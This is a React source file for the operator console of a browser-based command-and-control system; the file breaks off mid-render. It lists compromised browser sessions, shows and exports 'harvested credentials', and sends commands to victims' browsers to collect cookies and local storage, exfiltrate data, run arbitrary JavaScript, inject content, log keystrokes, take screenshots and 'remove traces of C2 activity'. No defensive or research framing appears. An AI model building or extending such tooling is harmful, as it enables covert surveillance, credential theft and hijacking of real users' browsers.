// src/components/cracked/tabs/C2Tab.js
import React, { useState, useEffect, useRef, useCallback } from "react";
import {
  FaDragon, FaSync, FaSpinner, FaExclamationTriangle, FaPlay,
  FaStop, FaCopy, FaDownload, FaTerminal, FaDesktop, FaNetworkWired,
  FaKey, FaChevronDown, FaChevronRight, FaCircle, FaLock, FaInfoCircle,
  FaCode, FaDatabase, FaCogs, FaEye, FaTimes, FaLaptopCode, FaFingerprint,
  FaSave, FaHistory, FaGlobe, FaCheckCircle, FaTrash, FaClock, FaSearch, FaChartBar
} from "react-icons/fa";
import { adminFetch } from '../csrfHelper';
import { v4 as uuidv4 } from 'uuid';



import io from 'socket.io-client';

const C2Tab = () => {
  // State for systems and active system
  const [systems, setSystems] = useState([]);
  const [activeSystems, setActiveSystems] = useState(0);
  const [selectedSystem, setSelectedSystem] = useState(null);
  const [selectedSystemDetails, setSelectedSystemDetails] = useState(null);
  
  // State for command control
  const [commandType, setCommandType] = useState("collect");
  const [commandInput, setCommandInput] = useState("");
  const [commandResults, setCommandResults] = useState([]);
  const [loadingResults, setLoadingResults] = useState(false);
  const [commandHistory, setCommandHistory] = useState([]);
  const [systemBeacons, setSystemBeacons] = useState([]);
  const [credentials, setCredentials] = useState([]);
  
  // Socket connection and credentials
  const [socket, setSocket] = useState(null);
  const [socketConnected, setSocketConnected] = useState(false);
  
  // UI state
  const [activeTab, setActiveTab] = useState("dashboard");
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const [dashboardStats, setDashboardStats] = useState(null);
  const [expandedSection, setExpandedSection] = useState("beacons");
  const [credentialsFilter, setCredentialsFilter] = useState("");
  const [filteredCredentials, setFilteredCredentials] = useState([]);
  
  // Refs
  const commandInputRef = useRef(null);
  const resultsContainerRef = useRef(null);

  // Command type options with descriptions
  const commandTypes = [
    { value: "collect", label: "Collect Data", description: "Gather information from browser storage, cookies, etc." },
    { value: "exfil", label: "Exfiltrate Data", description: "Send collected data to the C2 server" },
    { value: "eval", label: "Execute JavaScript", description: "Run custom JavaScript in the target's browser" },
    { value: "inject", label: "Inject Content", description: "Insert HTML, CSS, or JS into the page" },
    { value: "screenshot", label: "Take Screenshot", description: "Capture the current page view" },
    { value: "keylog", label: "Keylogger", description: "Start/stop recording keystrokes" },
    { value: "cleanup", label: "Cleanup", description: "Remove traces of C2 activity" }
  ];

  // Fetch dashboard overview
  const fetchDashboard = useCallback(async () => {
    try {
      const response = await adminFetch("/api/cracked/c2/dashboard");
      if (!response.ok) {
        throw new Error("Failed to fetch C2 dashboard data");
      }
      const data = await response.json();
      setDashboardStats(data.statistics);
      
      // Update active systems count
      if (data.statistics && data.statistics.active_sessions) {
        setActiveSystems(data.statistics.active_sessions);
      }
    } catch (err) {
      console.error("Error fetching dashboard:", err);
      setError(err.message);
    }
  }, []);

  // Fetch connected systems
  const fetchSystems = useCallback(async () => {
    setLoading(true);
    try {
      const response = await adminFetch("/api/cracked/c2/sessions");
      if (!response.ok) {
        throw new Error("Failed to fetch C2 sessions");
      }
      const data = await response.json();
      setSystems(data.sessions || []);
      
      // Keep selected system if it exists
      if (selectedSystem) {
        const stillExists = data.sessions.find(
          sys => sys.session_id === selectedSystem.session_id
        );
        
        if (stillExists) {
          // Update with fresh data
          setSelectedSystem(stillExists);
        } else {
          // Reset selection if system no longer exists
          setSelectedSystem(null);
          setSelectedSystemDetails(null);
        }
      }
    } catch (err) {
      console.error("Error fetching systems:", err);
      setError(err.message);
    } finally {
      setLoading(false);
    }
  }, [selectedSystem]);

  // Initialize socket.io connection
  useEffect(() => {
    const newSocket = io('/api/socket.io');
    
    newSocket.on('connect', () => {
      console.log('Socket connected');
      setSocketConnected(true);
      
      // Join the admin room for C2 events
      newSocket.emit('join_c2_admin');
    });
    
    newSocket.on('disconnect', () => {
      console.log('Socket disconnected');
      setSocketConnected(false);
    });
    
    // C2 specific event handlers
    newSocket.on('c2_status', (data) => {
      console.log('C2 Status:', data);
    });
    
    newSocket.on('c2_new_session', (data) => {
      console.log('New C2 Session:', data);
      // Add to systems list if not already there
      setSystems(prev => {
        if (!prev.find(sys => sys.session_id === data.session_id)) {
          return [...prev, data];
        }
        return prev;
      });
    });
    
    newSocket.on('c2_new_credential', (data) => {
      console.log('New Credential:', data);
      // Add to credentials list
      setCredentials(prev => [data.credential, ...prev]);
      // Update filtered credentials
      setFilteredCredentials(prev => [data.credential, ...prev]);
    });
    
    newSocket.on('c2_command_complete', (data) => {
      console.log('Command Complete:', data);
      // Add to results
      setCommandResults(prev => [data, ...prev]);
      // Update loading state
      setLoadingResults(false);
    });
    
    setSocket(newSocket);
    
    // Cleanup socket on unmount
    return () => {
      if (newSocket) {
        newSocket.disconnect();
      }
    };
  }, []);

  // Initial data fetch
  useEffect(() => {
    Promise.all([
      fetchDashboard(),
      fetchSystems()
    ]);
    
    // Set up refresh interval
    const interval = setInterval(() => {
      fetchDashboard();
      fetchSystems();
    }, 20000); // 20 second refresh
    
    return () => clearInterval(interval);
  }, [fetchDashboard, fetchSystems]);

  // Handle system selection
  const handleSystemSelect = useCallback(async (system) => {
    setSelectedSystem(system);
    
    try {
      // Fetch detailed system info
      const response = await adminFetch(`/api/cracked/c2/sessions/${system.session_id}`);
      if (!response.ok) {
        throw new Error("Failed to fetch system details");
      }
      const data = await response.json();
      setSelectedSystemDetails(data.session);
      
      // Extract system-specific data
      if (data.session) {
        setSystemBeacons(data.session.beacons || []);
        setCommandResults(data.session.commands || []);
        
        // Get commands for this system
        try {
          const commandsResponse = await adminFetch(
            `/api/cracked/c2/sessions/${system.session_id}/commands`
          );
          if (commandsResponse.ok) {
            const commandsData = await commandsResponse.json();
            setCommandHistory(commandsData.commands || []);
          }
        } catch (err) {
          console.error("Error fetching command history:", err);
        }
      }
    } catch (err) {
      console.error("Error fetching system details:", err);
    }
  }, []);

  // Handle command submission
  const handleCommandSubmit = async (e) => {
    e.preventDefault();
    
    if (!selectedSystem || !commandInput.trim()) {
      return;
    }
    
    // Prepare command parameters based on type
    const params = {};
    
    switch (commandType) {
      case "collect":
        params.dataType = commandInput;
        break;
      case "eval":
        params.code = commandInput;
        break;
      case "inject":
        params.content = commandInput;
        params.type = "script"; // Default to script
        break;
      case "keylog":
        params.action = commandInput.toLowerCase(); // "start" or "stop"
        break;
      default:
        params.data = commandInput;
        break;
    }
    
    // Create command object
    const command = {
      id: uuidv4(),
      type: commandType,
      params: params,
      timestamp: new Date().toISOString()
    };
    
    // Add to command history
    setCommandHistory(prev => [command, ...prev]);
    
    // Set loading state
    setLoadingResults(true);
    
    try {
      // Send command to backend
      const response = await adminFetch(
        `/api/cracked/c2/sessions/${selectedSystem.session_id}/command`,
        {
          method: "POST",
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            type: commandType,
            params: params
          })
        }
      );
      
      if (!response.ok) {
        throw new Error("Failed to send command");
      }
      
      // Reset command input
      setCommandInput("");
      
      // Focus input for next command
      if (commandInputRef.current) {
        commandInputRef.current.focus();
      }
      
      // Get command result
      const result = await response.json();
      console.log("Command sent:", result);
      
      // Note: The actual result will come back via socket event
    } catch (err) {
      console.error("Error sending command:", err);
      setLoadingResults(false);
    }
  };

  // Handle credentials filter change
  useEffect(() => {
    if (!credentialsFilter.trim()) {
      setFilteredCredentials(credentials);
      return;
    }
    
    const lowercaseFilter = credentialsFilter.toLowerCase();
    const filtered = credentials.filter(cred => {
      // Search in various credential fields
      return (
        (cred.source && cred.source.toLowerCase().includes(lowercaseFilter)) ||
        (cred.session_id && cred.session_id.toLowerCase().includes(lowercaseFilter)) ||
        (cred.url && cred.url.toLowerCase().includes(lowercaseFilter)) ||
        // Search in data fields
        (cred.data && typeof cred.data === 'object' && 
          Object.values(cred.data).some(val => 
            typeof val === 'string' && val.toLowerCase().includes(lowercaseFilter)
          )
        )
      );
    });
    
    setFilteredCredentials(filtered);
  }, [credentials, credentialsFilter]);

  // Fetch all harvested credentials
  const fetchAllCredentials = useCallback(async () => {
    try {
      const response = await adminFetch("/api/cracked/c2/credentials");
      if (!response.ok) {
        throw new Error("Failed to fetch credentials");
      }
      const data = await response.json();
      setCredentials(data.credentials || []);
      setFilteredCredentials(data.credentials || []);
    } catch (err) {
      console.error("Error fetching credentials:", err);
    }
  }, []);

  // Load credentials when tab changes to credentials
  useEffect(() => {
    if (activeTab === "credentials") {
      fetchAllCredentials();
    }
  }, [activeTab, fetchAllCredentials]);

  // Format timestamp
  const formatTimestamp = (timestamp) => {
    if (!timestamp) return "N/A";
    
    try {
      const date = new Date(timestamp);
      return date.toLocaleString();
    } catch (e) {
      return timestamp;
    }
  };

  // Copy to clipboard
  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text)
      .then(() => {
        // Success notification could go here
        console.log("Copied to clipboard");
      })
      .catch(err => {
        console.error("Failed to copy:", err);
      });
  };

  // Toggle section expansion
  const toggleSection = (section) => {
    setExpandedSection(expandedSection === section ? null : section);
  };

  // Render system list
  const renderSystemsList = () => {
    return (
      <div className="c2-systems-sidebar">
        <h3 className="c2-sidebar-title">Connected Systems</h3>
        
        {loading ? (
          <div className="c2-loading-indicator">
            <FaSpinner className="c2-spinner" />
            <span>Loading systems...</span>
          </div>
        ) : systems.length > 0 ? (
          <div className="c2-systems-list">
            {systems.map(system => (
              <div 
                key={system.session_id}
                className={`c2-system-item ${selectedSystem?.session_id === system.session_id ? 'active' : ''}`}
                onClick={() => handleSystemSelect(system)}
              >
                <div className="c2-system-status">
                  <FaCircle className={`c2-status-indicator ${system.online ? 'online' : 'offline'}`} />
                </div>
                <div className="c2-system-info">
                  <div className="c2-system-name">
                    {system.system_info?.hostname || `System ${system.session_id.substring(0, 8)}`}
                  </div>
                  <div className="c2-system-meta">
                    <span className="c2-system-ip">{system.ip}</span>
                    <span className="c2-system-activity">
                      Last seen: {formatRelativeTime(system.last_seen)}
                    </span>
                  </div>
                </div>
                <div className="c2-system-stats">
                  <div className="c2-system-stat" title="Beacons">
                    <FaNetworkWired />
                    <span>{system.beacon_count}</span>
                  </div>
                  <div className="c2-system-stat" title="Credentials">
                    <FaKey />
                    <span>{system.credentials_count}</span>
                  </div>
                  <div className="c2-system-stat" title="Commands">
                    <FaTerminal />
                    <span>{system.command_count}</span>
                  </div>
                </div>
              </div>
            ))}
          </div>
        ) : (
          <div className="c2-no-systems">
            <div className="c2-no-data-message">
              <FaInfoCircle />
              <p>No active C2 systems detected.</p>
            </div>
          </div>
        )}
      </div>
    );
  };

  // Format relative time
  const formatRelativeTime = (timestamp) => {
    if (!timestamp) return "Unknown";
    
    try {
      const date = new Date(timestamp);
      const now = new Date();
      const diffMs = now - date;
      const diffSec = Math.floor(diffMs / 1000);
      
      if (diffSec < 60) {
        return `${diffSec} sec ago`;
      } else if (diffSec < 3600) {
        return `${Math.floor(diffSec / 60)} min ago`;
      } else if (diffSec < 86400) {
        return `${Math.floor(diffSec / 3600)} hours ago`;
      } else {
        return formatTimestamp(timestamp);
      }
    } catch (e) {
      return timestamp;
    }
  };

  // Export JSON data
  const exportJSON = (data, filename) => {
    const jsonStr = JSON.stringify(data, null, 2);
    const blob = new Blob([jsonStr], { type: "application/json" });
    const url = URL.createObjectURL(blob);
    
    const link = document.createElement("a");
    link.href = url;
    link.download = filename;
    document.body.appendChild(link);
    link.click();
    
    // Cleanup
    document.body.removeChild(link);
    URL.revokeObjectURL(url);
  };

  // Render dashboard view
  const renderDashboard = () => {
    if (!dashboardStats) {
      return (
        <div className="c2-loading-container">
          <FaSpinner className="c2-spinner" />
          <p>Loading C2 dashboard data...</p>
        </div>
      );
    }
    
    return (
      <div className="c2-dashboard-container">
        {/* Statistics Cards */}
        <div className="c2-stats-cards">
          <div className="c2-stat-card">
            <div className="c2-stat-icon">
              <FaDesktop />
            </div>
            <div className="c2-stat-content">
              <div className="c2-stat-value">{dashboardStats.active_sessions}</div>
              <div className="c2-stat-label">Active Systems</div>
            </div>
          </div>
          
          <div className="c2-stat-card">
            <div className="c2-stat-icon">
              <FaNetworkWired />
            </div>
            <div className="c2-stat-content">
              <div className="c2-stat-value">{dashboardStats.total_sessions}</div>
              <div className="c2-stat-label">Total Systems</div>
            </div>
          </div>
          
          <div className="c2-stat-card">
            <div className="c2-stat-icon">
              <FaKey />
            </div>
            <div className="c2-stat-content">
              <div className="c2-stat-value">{dashboardStats.total_credentials}</div>
              <div className="c2-stat-label">Credentials</div>
            </div>
          </div>
          
          <div className="c2-stat-card">
            <div className="c2-stat-icon">
              <FaTerminal />
            </div>
            <div className="c2-stat-content">
              <div className="c2-stat-value">
                {dashboardStats.completed_commands}/{dashboardStats.total_commands}
              </div>
              <div className="c2-stat-label">Commands</div>
            </div>
          </div>
        </div>
        
        {/* Recent Activity */}
        <div className="c2-recent-activity-section">
          <h3 className="c2-section-title">Recent Activity</h3>
          <div className="c2-activity-list">
            {dashboardStats.recent_activity && dashboardStats.recent_activity.length > 0 ? (
              dashboardStats.recent_activity.map((activity, index) => (
                <div key={index} className="c2-activity-item">
                  <div className={`c2-activity-icon ${activity.type}`}>
                    {activity.type === 'command' ? <FaTerminal /> : <FaKey />}
                  </div>
                  <div className="c2-activity-details">
                    <div className="c2-activity-text">
                      {activity.type === 'command' ? (
                        <span>
                          Command <strong>{activity.command_type}</strong> on system <strong>{activity.session_id.substring(0, 8)}...</strong> - {activity.status}
                        </span>
                      ) : (
                        <span>
                          Credential from <strong>{activity.session_id.substring(0, 8)}...</strong> source: <strong>{activity.source}</strong>
                        </span>
                      )}
                    </div>
                    <div className="c2-activity-time">
                      {formatRelativeTime(activity.timestamp)}
                    </div>
                  </div>
                </div>
              ))
            ) : (
              <div className="c2-no-activity">
                <p>No recent activity to display.</p>
              </div>
            )}
          </div>
        </div>
        
        {/* Systems Map */}
        <div className="c2-systems-map-section">
          <h3 className="c2-section-title">Systems Overview</h3>
          <div className="c2-systems-map">
            {/* This would be a geographic map of connected systems */}
            <div className="c2-map-placeholder">
              <FaGlobe className="c2-map-icon" />
              <p>Geographic representation of connected systems would go here.</p>
            </div>
          </div>
        </div>
      </div>
    );
  };

  // Render system control panel
  const renderControlPanel = () => {
    if (!selectedSystem) {
      return (
        <div className="c2-no-system-selected">
          <div className="c2-no-selection-message">
            <FaDesktop className="c2-no-selection-icon" />
            <h3>No System Selected</h3>
            <p>Select a system from the sidebar to view details and send commands.</p>
          </div>
        </div>
      );
    }
    
    return (
      <div className="c2-control-panel">
        {/* System Header */}
        <div className="c2-system-header">
          <div className="c2-system-title">
            <h3>
              {selectedSystemDetails?.system_info?.hostname || 
               `System ${selectedSystem.session_id.substring(0, 8)}`}
            </h3>
            <span className={`c2-system-status-badge ${selectedSystem.online ? 'online' : 'offline'}`}>
              {selectedSystem.online ? 'Online' : 'Offline'}
            </span>
          </div>
          
          <div className="c2-system-controls">
            <button 
              className="c2-refresh-btn"
              onClick={() => handleSystemSelect(selectedSystem)}
              title="Refresh System Data"
            >
              <FaSync />
            </button>
          </div>
        </div>
        
        {/* System Info Cards */}
        <div className="c2-system-info-cards">
          <div className="c2-info-card">
            <div className="c2-info-label">IP Address</div>
            <div className="c2-info-value">{selectedSystem.ip}</div>
          </div>
          
          <div className="c2-info-card">
            <div className="c2-info-label">Last Seen</div>
            <div className="c2-info-value">{formatRelativeTime(selectedSystem.last_seen)}</div>
          </div>
          
          <div className="c2-info-card">
            <div className="c2-info-label">OS</div>
            <div className="c2-info-value">
              {selectedSystemDetails?.system_info?.osName || 'Unknown'} {selectedSystemDetails?.system_info?.osVersion || ''}
            </div>
          </div>
          
          <div className="c2-info-card">
            <div className="c2-info-label">Browser</div>
            <div className="c2-info-value">
              {selectedSystemDetails?.system_info?.browserName || 'Unknown'} {selectedSystemDetails?.system_info?.browserVersion || ''}
            </div>
          </div>
        </div>
        
        {/* Command Interface */}
        <div className="c2-command-interface">
          <div className="c2-command-header">
            <h4>Command Control</h4>
          </div>
          
          <form onSubmit={handleCommandSubmit} className="c2-command-form">
            <div className="c2-command-input-row">
              <div className="c2-command-type-select">
                <label htmlFor="command-type">Command Type:</label>
                <select 
                  id="command-type"
                  value={commandType}
                  onChange={(e) => setCommandType(e.target.value)}
                  className="c2-command-select"
                >
                  {commandTypes.map(type => (
                    <option key={type.value} value={type.value}>{type.label}</option>
                  ))}
                </select>
              </div>
              
              <div className="c2-command-description">
                {commandTypes.find(t => t.value === commandType)?.description}
              </div>
            </div>
            
            <div className="c2-command-input-container">
              <textarea
                ref={commandInputRef}
                value={commandInput}
                onChange={(e) => setCommandInput(e.target.value)}
                className="c2-command-textarea"
                placeholder={
                  commandType === 'collect' ? 'Enter data type (cookies, localStorage, formData, etc.)' :
                  commandType === 'eval' ? 'Enter JavaScript code to execute on target' :
                  commandType === 'inject' ? 'Enter content to inject into page' :
                  commandType === 'keylog' ? 'Enter "start" or "stop"' :
                  'Enter command parameters...'
                }
              />
            </div>
            
            <div className="c2-command-actions">
              <button 
                type="submit" 
                className="c2-send-command-btn"
                disabled={!commandInput.trim() || !selectedSystem.online}
              >
                {loadingResults ? (
                  <>
                    <FaSpinner className="c2-spinner" /> Sending...
                  </>
                ) : (
                  <>
                    <FaPlay /> Execute Command
                  </>
                )}
              </button>
            </div>
          </form>
        </div>
        
        {/* Expandable Sections */}
        <div className="c2-expandable-sections">
          {/* Command Results Section */}
          <div className="c2-expandable-section">
            <div 
              className="c2-section-header"
              onClick={() => toggleSection("results")}
            >
              <h4>
                {expandedSection === "results" ? 
                  <FaChevronDown className="c2-section-icon" /> : 
                  <FaChevronRight className="c2-section-icon" />
                }
                Command Results
              </h4>
            </div>
            
            {expandedSection === "results" && (
              <div className="c2-section-content" ref={resultsContainerRef}>
                {commandResults.length > 0 ? (
                  <div className="c2-results-list">
                    {commandResults.map((result, index) => (
                      <div key={index} className="c2-result-item">
                        <div className="c2-result-header">
                          <div className="c2-result-type">
                            {result.command_type || "Unknown"}
                          </div>
                          <div className="c2-result-time">
                            {formatTimestamp(result.timestamp)}
                          </div>
                        </div>
                        <div className="c2-result-content">
                          <pre className="c2-result-data">
                            {JSON.stringify(result.result, null, 2)}
                          </pre>
                        </div>
                        <div className="c2-result-actions">
                          <button 
                            className="c2-result-action-btn"
                            onClick={() => copyToClipboard(JSON.stringify(result.result, null, 2))}
                          >
                            <FaCopy /> Copy
                          </button>
                        </div>
                      </div>
                    ))}
                  </div>
                ) : (
                  <div className="c2-no-results">
                    <p>No command results available.</p>
                  </div>
                )}
              </div>
            )}
          </div>
          
          {/* Beacons Section */}
          <div className="c2-expandable-section">
            <div 
              className="c2-section-header"
              onClick={() => toggleSection("beacons")}
            >
              <h4>
                {expandedSection === "beacons" ? 
                  <FaChevronDown className="c2-section-icon" /> : 
                  <FaChevronRight className="c2-section-icon" />
                }
                Beacons & Activity
              </h4>
            </div>
            
            {expandedSection === "beacons" && (
              <div className="c2-section-content">
                {systemBeacons.length > 0 ? (
                  <div className="c2-beacons-list">
                    {systemBeacons.map((beacon, index) => (
                      <div key={index} className="c2-beacon-item">
                        <div className="c2-beacon-header">
                          <div className="c2-beacon-type">
                            {beacon.type || "beacon"}
                          </div>
                          <div className="c2-beacon-time">
                            {formatTimestamp(beacon.timestamp)}
                          </div>
                        </div>
                        <div className="c2-beacon-content">
                          <div className="c2-beacon-data">
                            <pre>
                              {JSON.stringify(beacon.data, null, 2)}
                            </pre>
                          </div>
                        </div>
                      </div>
                    ))}
                  </div>
                ) : (
                  <div className="c2-no-beacons">
                    <p>No beacon data available for this system.</p>
                  </div>
                )}
              </div>
            )}
          </div>
          
          {/* Command History Section */}
          <div className="c2-expandable-section">
            <div 
              className="c2-section-header"
              onClick={() => toggleSection("history")}
            >
              <h4>
                {expandedSection === "history" ? 
                  <FaChevronDown className="c2-section-icon" /> : 
                  <FaChevronRight className="c2-section-icon" />
                }
                Command History
              </h4>
            </div>
            
            {expandedSection === "history" && (
              <div className="c2-section-content">
                {commandHistory.length > 0 ? (
                  <div className="c2-history-list">
                    {commandHistory.map((command, index) => (
                      <div key={index} className="c2-history-item">
                        <div className="c2-history-header">
                          <div className="c2-history-type">
                            {command.command_type || command.type}
                          </div>
                          <div className="c2-history-status">
                            {command.status || "sent"}
                          </div>
                          <div className="c2-history-time">
                            {formatTimestamp(command.created_at || command.timestamp)}
                          </div>
                        </div>
                        <div className="c2-history-content">
                          <pre className="c2-history-params">
                            {JSON.stringify(command.params, null, 2)}
                          </pre>
                        </div>
                        <div className="c2-history-actions">
                          <button 
                            className="c2-history-action-btn"
                            onClick={() => {
                              if (command.params) {
                                // Set the command type
                                setCommandType(command.command_type || command.type);
                                
                                // Determine input based on command type
                                switch (command.command_type || command.type) {
                                  case 'collect':
                                    setCommandInput(command.params.dataType || '');
                                    break;
                                  case 'eval':
                                    setCommandInput(command.params.code || '');
                                    break;
                                  case 'inject':
                                    setCommandInput(command.params.content || '');
                                    break;
                                  case 'keylog':
                                    setCommandInput(command.params.action || '');
                                    break;
                                  default:
                                    setCommandInput(JSON.stringify(command.params, null, 2));
                                    break;
                                }
                              }
                            }}
                          >
                            <FaHistory /> Reuse
                          </button>
                        </div>
                      </div>
                    ))}
                  </div>
                ) : (
                  <div className="c2-no-history">
                    <p>No command history available for this system.</p>
                  </div>
                )}
              </div>
            )}
          </div>
          
          {/* System Details Section */}
          <div className="c2-expandable-section">
            <div 
              className="c2-section-header"
              onClick={() => toggleSection("details")}
            >
              <h4>
                {expandedSection === "details" ? 
                  <FaChevronDown className="c2-section-icon" /> : 
                  <FaChevronRight className="c2-section-icon" />
                }
                System Details
              </h4>
            </div>
            
            {expandedSection === "details" && (
              <div className="c2-section-content">
                {selectedSystemDetails ? (
                  <div className="c2-system-details">
                    <div className="c2-details-table-container">
                      <table className="c2-details-table">
                        <tbody>
                          {/* Browser Info */}
                          <tr className="c2-details-section-header">
                            <td colSpan="2">Browser Information</td>
                          </tr>
                          <tr>
                            <td>User Agent</td>
                            <td>{selectedSystemDetails.user_agent || "Unknown"}</td>
                          </tr>
                          <tr>
                            <td>Browser</td>
                            <td>{selectedSystemDetails.system_info?.browserName || "Unknown"} {selectedSystemDetails.system_info?.browserVersion || ""}</td>
                          </tr>
                          
                          {/* System Info */}
                          <tr className="c2-details-section-header">
                            <td colSpan="2">Operating System</td>
                          </tr>
                          <tr>
                            <td>OS Name</td>
                            <td>{selectedSystemDetails.system_info?.osName || "Unknown"}</td>
                          </tr>
                          <tr>
                            <td>OS Version</td>
                            <td>{selectedSystemDetails.system_info?.osVersion || "Unknown"}</td>
                          </tr>
                          <tr>
                            <td>Platform</td>
                            <td>{selectedSystemDetails.system_info?.platform || "Unknown"}</td>
                          </tr>
                          
                          {/* Hardware Info */}
                          <tr className="c2-details-section-header">
                            <td colSpan="2">Device Information</td>
                          </tr>
                          <tr>
                            <td>Screen Resolution</td>
                            <td>
                              {selectedSystemDetails.system_info?.screenWidth || "?"} × {selectedSystemDetails.system_info?.screenHeight || "?"}
                            </td>
                          </tr>
                          <tr>
                            <td>Device Type</td>
                            <td>
                              {selectedSystemDetails.system_info?.isMobile ? "Mobile" : "Desktop"}
                            </td>
                          </tr>
                          <tr>
                            <td>Memory</td>
                            <td>
                              {selectedSystemDetails.system_info?.deviceMemory ? `${selectedSystemDetails.system_info.deviceMemory} GB` : "Unknown"}
                            </td>
                          </tr>
                          <tr>
                            <td>CPU Cores</td>
                            <td>
                              {selectedSystemDetails.system_info?.hardwareConcurrency || "Unknown"}
                            </td>
                          </tr>
                          
                          {/* Network Info */}
                          <tr className="c2-details-section-header">
                            <td colSpan="2">Network Information</td>
                          </tr>
                          <tr>
                            <td>IP Address</td>
                            <td>{selectedSystemDetails.ip || "Unknown"}</td>
                          </tr>
                          <tr>
                            <td>Domain</td>
                            <td>{selectedSystemDetails.system_info?.url ? new URL(selectedSystemDetails.system_info.url).hostname : "Unknown"}</td>
                          </tr>
                          
                          {/* Session Info */}
                          <tr className="c2-details-section-header">
                            <td colSpan="2">Session Information</td>
                          </tr>
                          <tr>
                            <td>Session ID</td>
                            <td>
                              <div className="c2-copy-container">
                                <span>{selectedSystemDetails.session_id}</span>
                                <button 
                                  className="c2-copy-btn"
                                  onClick={() => copyToClipboard(selectedSystemDetails.session_id)}
                                >
                                  <FaCopy />
                                </button>
                              </div>
                            </td>
                          </tr>
                          <tr>
                            <td>First Seen</td>
                            <td>{formatTimestamp(selectedSystemDetails.first_seen)}</td>
                          </tr>
                          <tr>
                            <td>Last Seen</td>
                            <td>{formatTimestamp(selectedSystemDetails.last_seen)}</td>
                          </tr>
                          <tr>
                            <td>Beacons</td>
                            <td>{selectedSystemDetails.beacon_count || 0}</td>
                          </tr>
                          <tr>
                            <td>Commands</td>
                            <td>{selectedSystemDetails.command_count || 0}</td>
                          </tr>
                          <tr>
                            <td>Credentials</td>
                            <td>{selectedSystemDetails.credentials_count || 0}</td>
                          </tr>
                        </tbody>
                      </table>
                    </div>
                    
                    <div className="c2-details-actions">
                      <button
                        className="c2-details-action-btn"
                        onClick={() => exportJSON(selectedSystemDetails, `system-${selectedSystemDetails.session_id.substring(0, 8)}.json`)}
                      >
                        <FaDownload /> Export System Data
                      </button>
                    </div>
                  </div>
                ) : (
                  <div className="c2-no-details">
                    <p>Detailed system information is not available.</p>
                  </div>
                )}
              </div>
            )}
          </div>
        </div>
      </div>
    );
  };

  // Render credentials view
  const renderCredentials = () => {
    return (
      <div className="c2-credentials-container">
        <div className="c2-credentials-header">
          <h3 className="c2-credentials-title">Harvested Credentials</h3>
          <div className="c2-credentials-actions">
            <button 
              className="c2-refresh-creds-btn"
              onClick={fetchAllCredentials}
            >
              <FaSync /> Refresh
            </button>
            <button 
              className="c2-export-creds-btn"
              onClick={() => exportJSON(credentials, `credentials-${new Date().toISOString()}.json`)}
              disabled={credentials.length === 0}
            >
              <FaDownload /> Export All
            </button>
          </div>
        </div>
        
        {/* Filter */}
        <div className="c2-credentials-filter">
          <div className="c2-filter-input-wrapper">
            <FaSearch className="c2-filter-icon" />
            <input
              type="text"
              placeholder="Filter credentials..."
              className="c2-filter-input"
              value={credentialsFilter}
              onChange={(e) => setCredentialsFilter(e.target.value)}
            />
            {credentialsFilter && (
              <button 
                className="c2-clear-filter-btn"
                onClick={() => setCredentialsFilter("")}
              >
                <FaTimes />
              </button>
            )}
          </div>
          
          <div className="c2-filter-stats">
            Showing {filteredCredentials.length} of {credentials.length} credentials
          </div>
        </div>
        
        {/* Credentials List */}
        <div className="c2-credentials-list">
          {filteredCredentials.length > 0 ? (
            filteredCredentials.map((credential, index) => (
              <div key={index} className="c2-credential-card">
                <div className="c2-credential-header">
                  <div className="c2-credential-source">
                    <FaKey className="c2-credential-icon" />
                    <span className="c2-credential-type">
                      {credential.source || "Unknown source"}
                    </span>
                  </div>
                  <div className="c2-credential-time">
                    {formatTimestamp(credential.timestamp)}
                  </div>
                </div>
                
                <div className="c2-credential-content">
                  <div className="c2-credential-data">
                    <pre>{JSON.stringify(credential.data, null, 2)}</pre>
                  </div>
                  
                  <div className="c2-credential-meta">
                    <div className="c2-credential-info">
                      <div className="c2-credential-info-item">
                        <strong>Session ID:</strong> {credential.session_id}
                      </div>
                      <div className="c2-credential-info-item">
                        <strong>IP Address:</strong> {credential.ip}
                      </div>
                      {credential.url && (
                        <div className="c2-credential-info-item">
                          <strong>URL:</strong> {credential.url}
                        </div>
                      )}
                    </div>
                  </div>
                </div>
                
                <div className="c2-credential-actions">
                  <button
                    className="c2-credential-action-btn"
                    onClick={() => copyToClipboard(JSON.stringify(credential.data, null, 2))}
                  >
                    <FaCopy /> Copy
                  </button>
                  <button
                    className="c2-credential-action-btn"
                    onClick={() => {
                      const selectedSystem = systems.find(
                        sys => sys.session_id === credential.session_id
                      );
                      if (selectedSystem) {
                        setSelectedSystem(selectedSystem);
                        handleSystemSelect(selectedSystem);
                        setActiveTab("control");
                      }
                    }}
                  >
                    <FaDesktop /> View System
                  </button>
                </div>
              </div>
            ))
          ) : (
            <div className="c2-no-credentials">
              <div className="c2-no-data-message">
                <FaKey className="c2-no-data-icon" />
                <p>No credentials found{credentialsFilter ? " matching your filter" : ""}.</p>
              </div>
            </div>
          )}
        </div>
      </div>
    );
  };

  // Main render function
  return (
    <div className="admin-tab-content c2-tab">
      <div className="admin-content-header">
        <h2><FaDragon /> Command & Control</h2>
        <div className="c2-header-actions">
          <span className={`c2-socket-status ${socketConnected ? 'connected' : 'disconnected'}`}>
            <FaCircle className="c2-socket-indicator" />
            {socketConnected ? 'Connected' : 'Disconnected'}
          </span>
          <button 
            className="c2-refresh-btn" 
            onClick={() => {
              fetchDashboard();
              fetchSystems();
              if (selectedSystem) {
                handleSystemSelect(selectedSystem);
              }
            }}
            disabled={loading}
          >
            {loading ? <FaSpinner className="c2-spinner" /> : <FaSync />} Refresh
          </button>
        </div>
      </div>
      
      {error && (
        <div className="c2-error-message">
          <FaExclamationTriangle /> Error: {error}
        </div>
      )}
      
      <div className="c2-container">
        {/* Navigation Tabs */}
        <div className="c2-tabs">
          <div 
            className={`c2-tab-btn ${activeTab === 'dashboard' ? 'active' : ''}`}
            onClick={() => setActiveTab('dashboard')}
          >
            <FaChartBar /> Dashboard
          </div>
          <div 
            className={`c2-tab-btn ${activeTab === 'control' ? 'active' : ''}`}
            onClick={() => setActiveTab('control')}
          >
            <FaTerminal /> Control Panel
          </div>
          <div 
            className={`c2-tab-btn ${activeTab === 'credentials' ? 'active' : ''}`}
            onClick={() => setActiveTab('credentials')}
          >
            <FaKey /> Credentials
          </div>
        </div>
        
        {/* Main Content */}
        <div className="c2-content">
          {/* System List Sidebar - Always visible */}
          {renderSystemsList()}
          
          {/* Main Panel - Changes based on active tab */}
          <div className="c2-main-panel">
            {activeTab === 'dashboard' && renderDashboard()}
            {activeTab === 'control' && renderControlPanel()}
